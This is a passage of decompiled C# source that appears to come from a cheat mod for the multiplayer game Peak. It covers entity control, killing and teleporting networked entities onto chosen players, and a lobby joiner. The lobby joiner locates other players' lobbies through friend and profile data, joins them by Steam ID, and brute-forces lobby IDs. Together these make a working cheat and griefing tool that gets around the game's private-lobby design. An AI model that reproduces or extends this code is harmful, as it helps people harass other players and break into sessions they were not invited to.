		private static void EntityWalkTowards(Character charComponent, Vector3 targetPos, float mult = 1f, bool tryClimb = true, bool tryJump = true)
		{
			if (charComponent == null || charComponent.input == null || charComponent.data == null)
			{
				return;
			}
			try
			{
				EntityLookAt(charComponent, targetPos);
				float num = 0f;
				Type type = Type.GetType("HelperFunctions");
				if (type != null)
				{
					MethodInfo method = type.GetMethod("FlatDistance", BindingFlags.Static | BindingFlags.Public, null, new Type[2]
					{
						typeof(Vector3),
						typeof(Vector3)
					}, null);
					if (method != null)
					{
						num = (float)method.Invoke(null, new object[2] { charComponent.Center, targetPos });
					}
				}
				else
				{
					Vector3 val = targetPos - charComponent.Center;
					val.y = 0f;
					num = (val).magnitude;
				}
				if (Vector3.Distance(charComponent.Center, targetPos) < 5f)
				{
					if (num < 2.5f)
					{
						mult *= 0f;
					}
					else if (num < 1.5f)
					{
						mult *= -1f;
					}
				}
				charComponent.input.movementInput = new Vector2(0f, mult);
				if (tryClimb && (Object)(object)charComponent.refs?.climbing != (Object)null)
				{
					MethodInfo method2 = ((object)charComponent.refs.climbing).GetType().GetMethod("TryClimb", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method2 != null)
					{
						method2.Invoke(charComponent.refs.climbing, new object[1] { 1.25f });
					}
				}
				if (!tryJump || !(charComponent.data != null))
				{
					return;
				}
				Type type2 = Type.GetType("HelperFunctions");
				if (!(type2 != null))
				{
					return;
				}
				MethodInfo method3 = type2.GetMethod("LineCheck", BindingFlags.Static | BindingFlags.Public);
				if (!(method3 != null))
				{
					return;
				}
				Type type3 = Type.GetType("HelperFunctions+LayerType");
				if (!(type3 != null))
				{
					return;
				}
				object obj = Enum.Parse(type3, "TerrainMap");
				object obj2 = method3.Invoke(null, new object[3]
				{
					charComponent.Center,
					charComponent.Center + Vector3.down * 3f,
					obj
				});
				if (obj2 != null)
				{
					PropertyInfo property = obj2.GetType().GetProperty("transform");
					if (property != null && property.GetValue(obj2) == null)
					{
						charComponent.input.jumpWasPressed = true;
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] EntityWalkTowards failed: " + ex.Message));
			}
		}

		private static void EntityClimbTowards(Character charComponent, Vector3 targetPos, float mult = 1f)
		{
			if (charComponent == null || charComponent.input == null || charComponent.data == null)
			{
				return;
			}
			try
			{
				EntityLookAt(charComponent, targetPos);
				MethodInfo method = typeof(Character).GetMethod("GetBodypart", BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[1] { typeof(BodypartType) }, null);
				if (method != null)
				{
					object obj = method.Invoke(charComponent, new object[1] { (object)(BodypartType)2 });
					Bodypart val = (Bodypart)((obj is Bodypart) ? obj : null);
					if (val != null && (Object)(object)val.transform != (Object)null)
					{
						float num = Mathf.Clamp(val.transform.InverseTransformPoint(targetPos).x * 0.25f, -1f, 1f);
						charComponent.input.movementInput = new Vector2(num, mult);
					}
				}
				else if (charComponent.refs != null && charComponent.refs.ragdoll != null)
				{
					foreach (Bodypart part in charComponent.refs.ragdoll.partList)
					{
						if (part != null && (int)part.partType == 2 && (Object)(object)part.transform != (Object)null)
						{
							float num2 = Mathf.Clamp(part.transform.InverseTransformPoint(targetPos).x * 0.25f, -1f, 1f);
							charComponent.input.movementInput = new Vector2(num2, mult);
							break;
						}
					}
				}
				if (charComponent.data != null)
				{
					charComponent.data.currentStamina = 1f;
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] EntityClimbTowards failed: " + ex.Message));
			}
		}

		private static bool EntityCanSeeTarget(Character charComponent, Character target)
		{
			if (charComponent == null || target == null)
			{
				return false;
			}
			try
			{
				Type type = Type.GetType("HelperFunctions");
				if (type != null)
				{
					MethodInfo method = type.GetMethod("LineCheck", BindingFlags.Static | BindingFlags.Public);
					if (method != null)
					{
						Type type2 = Type.GetType("HelperFunctions+LayerType");
						if (type2 != null)
						{
							object obj = Enum.Parse(type2, "TerrainMap");
							Vector3 val = target.Center + Random.insideUnitSphere * 0.5f;
							object obj2 = method.Invoke(null, new object[3] { charComponent.Head, val, obj });
							if (obj2 != null)
							{
								PropertyInfo property = obj2.GetType().GetProperty("transform");
								if (property != null)
								{
									return property.GetValue(obj2) == null;
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] EntityCanSeeTarget failed: " + ex.Message));
			}
			return false;
		}

		private static void ApplyGameFeelRotation(ref Quaternion cameraRot)
		{
			try
			{
				GamefeelHandler instance = GamefeelHandler.instance;
				if (instance != null)
				{
					FieldInfo field = typeof(GamefeelHandler).GetField("rotation", BindingFlags.Instance | BindingFlags.Public);
					if (field != null)
					{
						Vector3 val = (Vector3)field.GetValue(instance);
						cameraRot *= Quaternion.Euler(val);
					}
				}
			}
			catch
			{
			}
		}

		private static void UpdateCameraOverride(Vector3 position, Quaternion rotation)
		{
			MainCamera instance = MainCamera.instance;
			if (instance == null)
			{
				return;
			}
			FieldInfo field = typeof(MainCamera).GetField("camOverride", BindingFlags.Instance | BindingFlags.NonPublic);
			if (!(field != null))
			{
				return;
			}
			CameraOverride val = (CameraOverride)field.GetValue(instance);
			if (!(val != null))
			{
				return;
			}
			val.transform.position = position;
			val.transform.rotation = rotation;
			try
			{
				MainCameraMovement instance2 = Singleton<MainCameraMovement>.Instance;
				if (instance2 != null)
				{
					MethodInfo method = typeof(MainCameraMovement).GetMethod("GetFov", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method != null)
					{
						float fieldOfView = (val.fov = (float)method.Invoke(instance2, null));
						Camera.main.fieldOfView = fieldOfView;
					}
				}
			}
			catch
			{
			}
		}

		public static bool IsControllingEntity()
		{
			return CheatConfig.CurrentlyControlledEntity != null;
		}

		public static Character GetControlledEntityCharacter()
		{
			if (CheatConfig.CurrentlyControlledEntity == null)
			{
				return null;
			}
			return CheatConfig.CurrentlyControlledEntity.GetComponent<Character>();
		}
	}
	public static class EntityManager
	{
		public static void InitializeSpawnedEntity(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				entity.SetActive(true);
				Character component = entity.GetComponent<Character>();
				if (component != null)
				{
					((Behaviour)component).enabled = true;
				}
				CharacterMovement component2 = entity.GetComponent<CharacterMovement>();
				if (component2 != null)
				{
					((Behaviour)component2).enabled = true;
				}
				EnableAIComponents(entity);
				CallInitializationMethods(entity);
				Rigidbody component3 = entity.GetComponent<Rigidbody>();
				if (component3 != null)
				{
					component3.isKinematic = false;
					component3.useGravity = true;
				}
				Collider[] componentsInChildren = entity.GetComponentsInChildren<Collider>();
				foreach (Collider val in componentsInChildren)
				{
					if (val != null)
					{
						val.enabled = true;
					}
				}
				Debug.Log((object)("[EntityManager] Initialized entity: " + ((Object)entity).name));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityManager] Error initializing entity: " + ex.Message));
			}
		}

		public static void CleanupDestroyedEntities()
		{
			CheatConfig.SpawnedEntities.RemoveAll((GameObject entity) => entity == null);
		}

		public static void KillEntity(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				if ((Object)(object)CheatConfig.CurrentlyControlledEntity == (Object)(object)entity)
				{
					EntityControl.DisableControl(entity);
				}
				PhotonNetwork.Destroy(entity);
				CheatConfig.SpawnedEntities.Remove(entity);
				Debug.Log((object)("[EntityManager] Killed entity: " + ((Object)entity).name));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityManager] Error killing entity: " + ex.Message));
			}
		}

		public static void TeleportEntityToMe(GameObject entity)
		{
			if (entity == null || Character.localCharacter == null)
			{
				return;
			}
			try
			{
				Vector3 position = Character.localCharacter.transform.position + Vector3.up * 1f;
				entity.transform.position = position;
				Debug.Log((object)("[EntityManager] Teleported entity to player: " + ((Object)entity).name));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityManager] Error teleporting entity: " + ex.Message));
			}
		}

		public static void TeleportEntityToPlayer(GameObject entity, Character targetPlayer)
		{
			if (entity == null || targetPlayer == null)
			{
				return;
			}
			try
			{
				Vector3 position = targetPlayer.transform.position + Vector3.up * 1f;
				entity.transform.position = position;
				Debug.Log((object)("[EntityManager] Teleported entity to player: " + ((Object)entity).name));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityManager] Error teleporting entity to player: " + ex.Message));
			}
		}

		public static List<MonoBehaviour> GetAIComponents(GameObject entity)
		{
			List<MonoBehaviour> list = new List<MonoBehaviour>();
			if (entity == null)
			{
				return list;
			}
			MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (!(val == null))
				{
					string name = ((object)val).GetType().Name;
					if (name.Contains("AI") || name.Contains("Enemy") || name.Contains("Zombie") || name.Contains("Behavior") || name.Contains("Controller") || name.Contains("Agent") || name.Contains("StateMachine"))
					{
						list.Add(val);
					}
				}
			}
			return list;
		}

		private static void EnableAIComponents(GameObject entity)
		{
			foreach (MonoBehaviour aIComponent in GetAIComponents(entity))
			{
				if (aIComponent != null)
				{
					((Behaviour)aIComponent).enabled = true;
				}
			}
		}

		private static void CallInitializationMethods(GameObject entity)
		{
			MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (val == null)
				{
					continue;
				}
				Type type = ((object)val).GetType();
				MethodInfo method = type.GetMethod("Initialize", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (method != null && method.GetParameters().Length == 0)
				{
					try
					{
						method.Invoke(val, null);
					}
					catch
					{
					}
				}
				MethodInfo method2 = type.GetMethod("Activate", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (method2 != null && method2.GetParameters().Length == 0)
				{
					try
					{
						method2.Invoke(val, null);
					}
					catch
					{
					}
				}
			}
		}
	}
	public static class LobbyJoiner
	{
		public struct LobbySearchResult
		{
			public ulong lobbyID;

			public string hostName;

			public int memberCount;

			public List<string> memberNames;
		}

		public struct JoinableLobbyInfo
		{
			public ulong lobbyID;

			public ulong hostSteamID;

			public string hostName;

			public int currentPlayers;

			public int maxPlayers;

			public bool isJoinable;

			public string gameName;
		}

		private static string lastJoinMessage = "";

		private static float lastJoinMessageTime = 0f;

		private static bool isSearchingLobbies = false;

		private static List<LobbySearchResult> searchResults = new List<LobbySearchResult>();

		private static List<JoinableLobbyInfo> joinableLobbies = new List<JoinableLobbyInfo>();

		private static Callback<LobbyMatchList_t> lobbyMatchListCallback;

		private static string SearchUsername = "";

		private static int SearchMaxResults = 50;

		private static ulong SearchSteamID = 0uL;

		public static bool IsSearching => isSearchingLobbies;

		public static List<LobbySearchResult> SearchResults => searchResults;

		public static List<JoinableLobbyInfo> JoinableLobbies => joinableLobbies;

		public static string LastJoinMessage
		{
			get
			{
				return lastJoinMessage;
			}
			set
			{
				lastJoinMessage = value;
				lastJoinMessageTime = Time.time;
			}
		}

		public static float LastJoinMessageTime => lastJoinMessageTime;

		public static bool JoinLobbyByID(ulong lobbyID)
		{
			try
			{
				if (lobbyID == 0L)
				{
					LastJoinMessage = "Invalid lobby ID (cannot be 0)";
					Debug.LogError((object)"[LobbyJoiner] Invalid lobby ID");
					return false;
				}
				SteamLobbyHandler steamLobbyHandler = GetSteamLobbyHandler();
				if (steamLobbyHandler == null)
				{
					LastJoinMessage = "Failed to get SteamLobbyHandler service";
					Debug.LogError((object)"[LobbyJoiner] SteamLobbyHandler not found");
					return false;
				}
				if (PhotonNetwork.InRoom)
				{
					Debug.Log((object)"[LobbyJoiner] Leaving current room before joining new lobby");
					PhotonNetwork.LeaveRoom(true);
				}
				try
				{
					Type typeFromHandle = typeof(SteamLobbyHandler);
					MethodInfo method = typeFromHandle.GetMethod("InSteamLobby", BindingFlags.Instance | BindingFlags.Public, null, new Type[0], null);
					if (method != null && (bool)method.Invoke(steamLobbyHandler, null))
					{
						Debug.Log((object)"[LobbyJoiner] Leaving current Steam lobby before joining new one");
						MethodInfo method2 = typeFromHandle.GetMethod("LeaveLobby", BindingFlags.Instance | BindingFlags.Public);
						if (method2 != null)
						{
							method2.Invoke(steamLobbyHandler, null);
						}
					}
				}
				catch (Exception ex)
				{
					Debug.LogWarning((object)("[LobbyJoiner] Could not check/leave current lobby: " + ex.Message));
				}
				CSteamID val = default(CSteamID);
				((CSteamID)(ref val))..ctor(lobbyID);
				steamLobbyHandler.TryJoinLobby(val);
				LastJoinMessage = $"Attempting to join lobby: {lobbyID}";
				Debug.Log((object)$"[LobbyJoiner] Attempting to join lobby: {lobbyID}");
				return true;
			}
			catch (Exception ex2)
			{
				LastJoinMessage = "Error: " + ex2.Message;
				Debug.LogError((object)("[LobbyJoiner] Error joining lobby: " + ex2.Message + "\n" + ex2.StackTrace));
				return false;
			}
		}

		public static bool SearchAndJoinBySteamID(ulong targetSteamID)
		{
			if (isSearchingLobbies)
			{
				LastJoinMessage = "Search already in progress";
				return false;
			}
			try
			{
				if (lobbyMatchListCallback == null)
				{
					lobbyMatchListCallback = Callback<LobbyMatchList_t>.Create((DispatchDelegate<LobbyMatchList_t>)OnLobbyMatchList);
				}
				searchResults.Clear();
				isSearchingLobbies = true;
				SearchSteamID = targetSteamID;
				SearchUsername = "";
				SearchMaxResults = 100;
				SteamMatchmaking.AddRequestLobbyListDistanceFilter((ELobbyDistanceFilter)1);
				SteamMatchmaking.AddRequestLobbyListFilterSlotsAvailable(1);
				if (SteamMatchmaking.RequestLobbyList() == SteamAPICall_t.Invalid)
				{
					isSearchingLobbies = false;
					LastJoinMessage = "Failed to request lobby list";
					Debug.LogError((object)"[LobbyJoiner] Failed to request lobby list");
					return false;
				}
				LastJoinMessage = $"Searching public lobbies for Steam ID {targetSteamID}...";
				Debug.Log((object)$"[LobbyJoiner] Searching public lobbies for Steam ID {targetSteamID}");
				return true;
			}
			catch (Exception ex)
			{
				isSearchingLobbies = false;
				LastJoinMessage = "Error: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error searching by Steam ID: " + ex.Message + "\n" + ex.StackTrace));
				return false;
			}
		}

		public static bool JoinLobbyByIDString(string lobbyIDString)
		{
			if (string.IsNullOrEmpty(lobbyIDString))
			{
				LastJoinMessage = "Lobby ID cannot be empty";
				return false;
			}
			if (ulong.TryParse(lobbyIDString, out var result))
			{
				return JoinLobbyByID(result);
			}
			LastJoinMessage = "Invalid lobby ID format (must be a number)";
			Debug.LogError((object)("[LobbyJoiner] Invalid lobby ID format: " + lobbyIDString));
			return false;
		}

		public static bool JoinLobbyByPlayerSteamID(ulong steamID)
		{
			try
			{
				if (steamID == 0L)
				{
					LastJoinMessage = "Invalid Steam ID (cannot be 0)";
					return false;
				}
				CSteamID val = default(CSteamID);
				((CSteamID)(ref val))..ctor(steamID);
				FriendGameInfo_t val2 = default(FriendGameInfo_t);
				if (SteamFriends.HasFriend(val, (EFriendFlags)0) && SteamFriends.GetFriendGamePlayed(val, ref val2) && val2.m_steamIDLobby.m_SteamID != 0L)
				{
					ulong steamID2 = val2.m_steamIDLobby.m_SteamID;
					LastJoinMessage = $"Found lobby {steamID2} for friend {steamID}, attempting to join...";
					Debug.Log((object)$"[LobbyJoiner] Found lobby {steamID2} for friend {steamID}");
					return JoinLobbyByID(steamID2);
				}
				SteamFriends.RequestUserInformation(val, true);
				FriendGameInfo_t val3 = default(FriendGameInfo_t);
				if (SteamFriends.GetFriendGamePlayed(val, ref val3) && val3.m_steamIDLobby.m_SteamID != 0L)
				{
					ulong steamID3 = val3.m_steamIDLobby.m_SteamID;
					LastJoinMessage = $"Found lobby {steamID3} from public profile {steamID}, attempting to join...";
					Debug.Log((object)$"[LobbyJoiner] Found lobby {steamID3} from public profile {steamID}");
					return JoinLobbyByID(steamID3);
				}
				LastJoinMessage = $"Profile method failed, searching public lobbies for Steam ID {steamID}...";
				Debug.Log((object)$"[LobbyJoiner] Profile method failed for {steamID}, searching public lobbies...");
				return SearchAndJoinBySteamID(steamID);
			}
			catch (Exception ex)
			{
				LastJoinMessage = "Error: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error joining lobby by Steam ID: " + ex.Message + "\n" + ex.StackTrace));
				return false;
			}
		}

		public static bool JoinLobbyByPlayerSteamIDString(string steamIDString)
		{
			if (string.IsNullOrEmpty(steamIDString))
			{
				LastJoinMessage = "Steam ID cannot be empty";
				return false;
			}
			if (ulong.TryParse(steamIDString, out var result))
			{
				return JoinLobbyByPlayerSteamID(result);
			}
			LastJoinMessage = "Invalid Steam ID format (must be a number)";
			Debug.LogError((object)("[LobbyJoiner] Invalid Steam ID format: " + steamIDString));
			return false;
		}

		private static SteamLobbyHandler GetSteamLobbyHandler()
		{
			try
			{
				MethodInfo method = typeof(GameHandler).GetMethod("GetService", BindingFlags.Static | BindingFlags.Public);
				if (method == null)
				{
					Debug.LogError((object)"[LobbyJoiner] GetService method not found on GameHandler");
					return null;
				}
				object obj = method.MakeGenericMethod(typeof(SteamLobbyHandler)).Invoke(null, null);
				SteamLobbyHandler val = (SteamLobbyHandler)((obj is SteamLobbyHandler) ? obj : null);
				if (val != null)
				{
					return val;
				}
				Debug.LogError((object)"[LobbyJoiner] GetService returned null or wrong type");
				return null;
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[LobbyJoiner] Error getting SteamLobbyHandler: " + ex.Message + "\n" + ex.StackTrace));
				return null;
			}
		}

		public static List<JoinableLobbyInfo> FindJoinablePeakLobbies(int maxResults = 50)
		{
			joinableLobbies.Clear();
			Dictionary<ulong, JoinableLobbyInfo> dictionary = new Dictionary<ulong, JoinableLobbyInfo>();
			try
			{
				AppId_t appID = SteamUtils.GetAppID();
				Debug.Log((object)$"[LobbyJoiner] Finding players playing Peak (AppID: {appID.m_AppId})...");
				int friendCount = SteamFriends.GetFriendCount((EFriendFlags)65535);
				Debug.Log((object)$"[LobbyJoiner] Checking {friendCount} friends for Peak lobbies...");
				int num = 0;
				FriendGameInfo_t val = default(FriendGameInfo_t);
				for (int i = 0; i < friendCount; i++)
				{
					if (joinableLobbies.Count >= maxResults)
					{
						break;
					}
					CSteamID friendByIndex = SteamFriends.GetFriendByIndex(i, (EFriendFlags)65535);
					if (friendByIndex == CSteamID.Nil || !SteamFriends.GetFriendGamePlayed(friendByIndex, ref val) || ((CGameID)(ref val.m_gameID)).AppID().m_AppId != appID.m_AppId)
					{
						continue;
					}
					num++;
					if (val.m_steamIDLobby.m_SteamID == 0L)
					{
						continue;
					}
					ulong steamID = val.m_steamIDLobby.m_SteamID;
					if (!dictionary.ContainsKey(steamID))
					{
						CSteamID val2 = new CSteamID(steamID);
						int numLobbyMembers = SteamMatchmaking.GetNumLobbyMembers(val2);
						int lobbyMemberLimit = SteamMatchmaking.GetLobbyMemberLimit(val2);
						CSteamID lobbyOwner = SteamMatchmaking.GetLobbyOwner(val2);
						string text = ((lobbyOwner != CSteamID.Nil) ? SteamFriends.GetFriendPersonaName(lobbyOwner) : "Unknown");
						bool flag = lobbyMemberLimit == 0 || numLobbyMembers < lobbyMemberLimit;
						JoinableLobbyInfo joinableLobbyInfo = default(JoinableLobbyInfo);
						joinableLobbyInfo.lobbyID = steamID;
						joinableLobbyInfo.hostSteamID = lobbyOwner.m_SteamID;
						joinableLobbyInfo.hostName = text;
						joinableLobbyInfo.currentPlayers = numLobbyMembers;
						joinableLobbyInfo.maxPlayers = ((lobbyMemberLimit > 0) ? lobbyMemberLimit : 4);
						joinableLobbyInfo.isJoinable = flag;
						joinableLobbyInfo.gameName = "Peak";
						JoinableLobbyInfo item = (dictionary[steamID] = joinableLobbyInfo);
						if (flag)
						{
							joinableLobbies.Add(item);
							Debug.Log((object)$"[LobbyJoiner] Found joinable Peak lobby: {steamID} hosted by {text} ({numLobbyMembers}/{((lobbyMemberLimit > 0) ? lobbyMemberLimit : 4)} players)");
						}
						else
						{
							Debug.Log((object)$"[LobbyJoiner] Found Peak lobby {steamID} but not joinable (full: {numLobbyMembers >= lobbyMemberLimit})");
						}
					}
				}
				CSteamID val3 = default(CSteamID);
				foreach (LobbySearchResult searchResult in searchResults)
				{
					if (dictionary.ContainsKey(searchResult.lobbyID))
					{
						continue;
					}
					((CSteamID)(ref val3))..ctor(searchResult.lobbyID);
					int memberCount = searchResult.memberCount;
					int lobbyMemberLimit2 = SteamMatchmaking.GetLobbyMemberLimit(val3);
					if (lobbyMemberLimit2 == 0 || memberCount < lobbyMemberLimit2)
					{
						CSteamID lobbyOwner2 = SteamMatchmaking.GetLobbyOwner(val3);
						JoinableLobbyInfo joinableLobbyInfo = default(JoinableLobbyInfo);
						joinableLobbyInfo.lobbyID = searchResult.lobbyID;
						joinableLobbyInfo.hostSteamID = lobbyOwner2.m_SteamID;
						joinableLobbyInfo.hostName = searchResult.hostName;
						joinableLobbyInfo.currentPlayers = memberCount;
						joinableLobbyInfo.maxPlayers = ((lobbyMemberLimit2 > 0) ? lobbyMemberLimit2 : 4);
						joinableLobbyInfo.isJoinable = true;
						joinableLobbyInfo.gameName = "Peak";
						JoinableLobbyInfo joinableLobbyInfo3 = joinableLobbyInfo;
						if (!dictionary.ContainsKey(searchResult.lobbyID))
						{
							dictionary[searchResult.lobbyID] = joinableLobbyInfo3;
							joinableLobbies.Add(joinableLobbyInfo3);
						}
					}
				}
				joinableLobbies.Sort((JoinableLobbyInfo a, JoinableLobbyInfo b) => b.currentPlayers.CompareTo(a.currentPlayers));
				LastJoinMessage = $"Found {num} Peak players, {joinableLobbies.Count} joinable lobby/lobbies";
				Debug.Log((object)$"[LobbyJoiner] Found {num} Peak players, {joinableLobbies.Count} joinable lobbies");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[LobbyJoiner] Error finding joinable Peak lobbies: " + ex.Message + "\n" + ex.StackTrace));
				LastJoinMessage = "Error: " + ex.Message;
			}
			return joinableLobbies;
		}

		public static List<ulong> DiscoverLobbyIDs(int maxResults = 20)
		{
			List<ulong> list = new List<ulong>();
			try
			{
				int friendCount = SteamFriends.GetFriendCount((EFriendFlags)65535);
				Debug.Log((object)$"[LobbyJoiner] Checking {friendCount} friends for lobby IDs...");
				FriendGameInfo_t val = default(FriendGameInfo_t);
				for (int i = 0; i < friendCount; i++)
				{
					if (list.Count >= maxResults)
					{
						break;
					}
					CSteamID friendByIndex = SteamFriends.GetFriendByIndex(i, (EFriendFlags)65535);
					if (friendByIndex == CSteamID.Nil)
					{
						continue;
					}
					if (SteamFriends.GetFriendGamePlayed(friendByIndex, ref val) && val.m_steamIDLobby.m_SteamID != 0L)
					{
						ulong steamID = val.m_steamIDLobby.m_SteamID;
						if (!list.Contains(steamID))
						{
							list.Add(steamID);
							Debug.Log((object)$"[LobbyJoiner] Discovered lobby {steamID} from friend {SteamFriends.GetFriendPersonaName(friendByIndex)}");
						}
					}
					string.IsNullOrEmpty(SteamFriends.GetFriendRichPresence(friendByIndex, "steam_player_group"));
				}
				LastJoinMessage = $"Discovered {list.Count} lobby/lobbies from friends";
				Debug.Log((object)$"[LobbyJoiner] Discovered {list.Count} lobbies");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[LobbyJoiner] Error discovering lobbies: " + ex.Message + "\n" + ex.StackTrace));
			}
			return list;
		}

		public static List<ulong> BruteForceLobbyIDs(ulong baseLobbyID, int range = 1000, int maxResults = 10)
		{
			List<ulong> list = new List<ulong>();
			if (baseLobbyID == 0L)
			{
				LastJoinMessage = "Cannot brute force: base lobby ID is 0";
				return list;
			}
			LastJoinMessage = $"Brute forcing lobby IDs around {baseLobbyID} (�{range})... This may take a while...";
			Debug.LogWarning((object)"[LobbyJoiner] WARNING: Brute forcing lobby IDs is slow and unlikely to work!");
			try
			{
				int num = 0;
				int num2 = 0;
				for (ulong num3 = 0uL; num3 < (ulong)range; num3++)
				{
					if (num2 >= maxResults)
					{
						break;
					}
					ulong[] array = new ulong[2]
					{
						baseLobbyID + num3,
						baseLobbyID - num3
					};
					foreach (ulong num4 in array)
					{
						if (num4 == 0L || list.Contains(num4))
						{
							continue;
						}
						num++;
						if (SteamMatchmaking.RequestLobbyData(new CSteamID(num4)))
						{
							list.Add(num4);
							num2++;
							Debug.Log((object)$"[LobbyJoiner] Found potential lobby: {num4}");
							if (num2 >= maxResults)
							{
								break;
							}
						}
						if (num % 100 == 0)
						{
							Thread.Sleep(10);
						}
					}
				}
				LastJoinMessage = $"Brute force complete: checked {num} IDs, found {num2} potential lobbies";
				Debug.Log((object)$"[LobbyJoiner] Brute force: checked {num}, found {num2}");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[LobbyJoiner] Error brute forcing: " + ex.Message + "\n" + ex.StackTrace));
				LastJoinMessage = "Brute force error: " + ex.Message;
			}
			return list;
		}

		public static ulong GetCurrentLobbyID()
		{
			try
			{
				SteamLobbyHandler steamLobbyHandler = GetSteamLobbyHandler();
				if (steamLobbyHandler == null)
				{
					return 0uL;
				}
				PropertyInfo property = typeof(SteamLobbyHandler).GetProperty("CurrentLobbyID", BindingFlags.Instance | BindingFlags.Public);
				if (property != null)
				{
					string text = property.GetValue(steamLobbyHandler) as string;
					if (!string.IsNullOrEmpty(text) && ulong.TryParse(text, out var result))
					{
						return result;
					}
				}
				return 0uL;
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[LobbyJoiner] Error getting current lobby ID: " + ex.Message));
				return 0uL;
			}
		}

		public static bool GetAllLobbies(int maxResults = 50)
		{
			if (isSearchingLobbies)
			{
				LastJoinMessage = "Search already in progress";
				return false;
			}
			try
			{
				if (lobbyMatchListCallback == null)
				{
					lobbyMatchListCallback = Callback<LobbyMatchList_t>.Create((DispatchDelegate<LobbyMatchList_t>)OnLobbyMatchList);
				}
				searchResults.Clear();
				isSearchingLobbies = true;
				SteamMatchmaking.AddRequestLobbyListDistanceFilter((ELobbyDistanceFilter)1);
				SteamMatchmaking.AddRequestLobbyListFilterSlotsAvailable(1);
				if (SteamMatchmaking.RequestLobbyList() == SteamAPICall_t.Invalid)
				{
					isSearchingLobbies = false;
					LastJoinMessage = "Failed to request lobby list";
					Debug.LogError((object)"[LobbyJoiner] Failed to request lobby list");
					return false;
				}
				SearchUsername = "";
				SearchMaxResults = maxResults;
				LastJoinMessage = "Fetching all available lobbies...";
				Debug.Log((object)"[LobbyJoiner] Fetching all available lobbies");
				return true;
			}
			catch (Exception ex)
			{
				isSearchingLobbies = false;
				LastJoinMessage = "Error: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error fetching lobbies: " + ex.Message + "\n" + ex.StackTrace));
				return false;
			}
		}

		public static bool SearchLobbiesByUsername(string username, int maxResults = 50)
		{
			if (isSearchingLobbies)
			{
				LastJoinMessage = "Search already in progress";
				return false;
			}
			if (string.IsNullOrEmpty(username))
			{
				LastJoinMessage = "Username cannot be empty";
				return false;
			}
			try
			{
				if (lobbyMatchListCallback == null)
				{
					lobbyMatchListCallback = Callback<LobbyMatchList_t>.Create((DispatchDelegate<LobbyMatchList_t>)OnLobbyMatchList);
				}
				searchResults.Clear();
				isSearchingLobbies = true;
				SteamMatchmaking.AddRequestLobbyListDistanceFilter((ELobbyDistanceFilter)1);
				SteamMatchmaking.AddRequestLobbyListFilterSlotsAvailable(1);
				if (SteamMatchmaking.RequestLobbyList() == SteamAPICall_t.Invalid)
				{
					isSearchingLobbies = false;
					LastJoinMessage = "Failed to request lobby list";
					Debug.LogError((object)"[LobbyJoiner] Failed to request lobby list");
					return false;
				}
				SearchUsername = username.ToLower();
				SearchMaxResults = maxResults;
				LastJoinMessage = "Searching for lobbies with username '" + username + "'...";
				Debug.Log((object)("[LobbyJoiner] Searching for lobbies with username '" + username + "'"));
				return true;
			}
			catch (Exception ex)
			{
				isSearchingLobbies = false;
				LastJoinMessage = "Error: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error searching lobbies: " + ex.Message + "\n" + ex.StackTrace));
				return false;
			}
		}

		private static void OnLobbyMatchList(LobbyMatchList_t param)
		{
			try
			{
				isSearchingLobbies = false;
				searchResults.Clear();
				int nLobbiesMatching = (int)param.m_nLobbiesMatching;
				string arg = ((SearchSteamID != 0L) ? $"Steam ID {SearchSteamID}" : ((!string.IsNullOrEmpty(SearchUsername)) ? ("username '" + SearchUsername + "'") : "all lobbies"));
				Debug.Log((object)$"[LobbyJoiner] Found {nLobbiesMatching} lobbies, searching for {arg}");
				if (nLobbiesMatching == 0)
				{
					if (SearchSteamID != 0L)
					{
						LastJoinMessage = $"No public lobbies found containing Steam ID {SearchSteamID} (they may be in a private lobby or offline)";
					}
					else
					{
						LastJoinMessage = "No public lobbies found (game uses private lobbies by default)";
					}
					SearchSteamID = 0uL;
					return;
				}
				int num = 0;
				int num2 = Mathf.Min(nLobbiesMatching, SearchMaxResults);
				List<LobbySearchResult> list = new List<LobbySearchResult>();
				ulong num3 = 0uL;
				for (int i = 0; i < num2; i++)
				{
					CSteamID lobbyByIndex = SteamMatchmaking.GetLobbyByIndex(i);
					if (lobbyByIndex == CSteamID.Nil)
					{
						continue;
					}
					num++;
					int numLobbyMembers = SteamMatchmaking.GetNumLobbyMembers(lobbyByIndex);
					List<string> list2 = new List<string>();
					bool flag = false;
					bool flag2 = false;
					for (int j = 0; j < numLobbyMembers; j++)
					{
						CSteamID lobbyMemberByIndex = SteamMatchmaking.GetLobbyMemberByIndex(lobbyByIndex, j);
						if (!(lobbyMemberByIndex != CSteamID.Nil))
						{
							continue;
						}
						if (SearchSteamID != 0L && lobbyMemberByIndex.m_SteamID == SearchSteamID)
						{
							flag2 = true;
							flag = true;
							num3 = lobbyByIndex.m_SteamID;
							Debug.Log((object)$"[LobbyJoiner] Found target Steam ID {SearchSteamID} in lobby {lobbyByIndex.m_SteamID}!");
						}
						string friendPersonaName = SteamFriends.GetFriendPersonaName(lobbyMemberByIndex);
